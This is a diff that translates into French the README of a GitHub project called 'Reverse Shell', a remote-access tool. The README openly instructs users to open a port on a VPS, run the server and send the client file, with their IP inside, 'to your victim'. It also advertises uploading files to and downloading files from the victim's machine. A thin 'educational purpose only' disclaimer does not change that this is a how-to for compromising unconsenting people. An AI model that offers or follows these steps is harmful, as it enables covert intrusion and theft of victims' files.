@@ -2,8 +2,8 @@
 <h1 align='center'>Reverse Shell 🧨</h1>
 
 <p align='center'>
-  <b>Star ⭐ if you want more</b><br>
-<i>(English READM.md <a href="https://github.com/DictateurMiro/reverse-shell/blob/main/English-README.md">here</a>)</i>
+  <b>Star ⭐ si vous voulez plus</b><br>
+<i>(English README.md <a href="https://github.com/DictateurMiro/reverse-shell/blob/main/English-README.md">here</a>)</i>
 </p>
 
 <p align="center">
@@ -25,12 +25,12 @@ Contact :
 
 ---
 
-## 🌙 Features
+## 🌙 Caractéristiques
 ```sh-session
-✔ Automatic connection to the server
-✔ Automatic install module for client
-✔ Beautiful UI
-✔ Download and Upload file
+✔ Connexion automatique sur le serveur
+✔ Installation de modules automatique côté client
+✔ Interface magnifique
+✔ Envoyé et Téléchargé des fichiers
 ```
 ---
 
@@ -44,14 +44,14 @@ Contact :
 
 ---
 
-## 🚀 Setup
+## 🚀 Installation & Configuration
 
 ```sh-session
-> Download zip file (git clone https://github.com/DictateurMiro/reverse-shell.git)
-> Open port 13037 on your vps
-> Run server.py
-> Send client.pyw (with the ip in the file) to your victim
-> Enjoy!
+> Téléchargé le fichier (git clone https://github.com/DictateurMiro/reverse-shell.git)
+> Ouvrez le port 13037 sur votre vps
+> Lancez server.py
+> Envoyez client.pyw (avec l'ip de votre vps dans le fichier) a votre victime
+> Fini !
 ```
 
 ---
@@ -59,7 +59,7 @@ Contact :
 ## 🎉 Upcoming / enhancements
 
 ```sh-session
-- Working with linux host
+- Fonctionne avec un hôte Linux
 ```
 
 ---
@@ -82,11 +82,11 @@ Contact :
 
 ## 📋 License
 
-This project is licensed under the MIT License
+Ce projet est placé sous la licence MIT
 ```js
-  ・Educational purpose only and all your consequences caused by you actions is your responsibility
-  ・Selling this Free Tool is forbidden
-  ・If you make a copy of this/or fork it, it must be open-source and have credits linking to this repo
+  ・A des fins éducatives uniquement et toutes les conséquences causées par vos actions sont de votre responsabilité.
+  ・La vente de cet outil gratuit est interdite
+  ・Si vous faites une copie de ce document ou si vous le mettez en ligne, il doit s'agir d'un logiciel libre et les crédits doivent renvoyer à ce repo
 ```
 
 ---
@@ -96,19 +96,19 @@ This project is licensed under the MIT License
 ```diff
 
 v1.3.1 ⋮ 23/10/2023
-+ Added (Useful command) in README.md to explain the commands and how to use them
++ Ajout (des commandes utile) dans README.md ainsi d'une explication de comment les utiliser 
 
 v1.3 ⋮ 21/10/2023
-+ Added 'download' command to download file from the client to the server download directory
++ Ajout de la commande 'download' Pour directement téléchargé des fichier de la victime sur votre VPS
 
 v1.2 ⋮ 20/10/2023
-+ Added 'upload' command to upload in the download directory of the client
-- Remove 'keyboard' module on server because it's useless
++ Ajout de la commande 'upload' Pour envoyer des fichiers de votre VPS à votre victime
+- Suppresion du module 'keyboard' car il était inutile
 
 v1.1 ⋮ 16/10/2023
-+ Added a video to demonstrate
++ Ajout d'une video pour expliquer le fonctionnement 
 ```
 
 <p align="center">
-  README inspired from xKiian
+  README inspiré de xKiian
 </p>
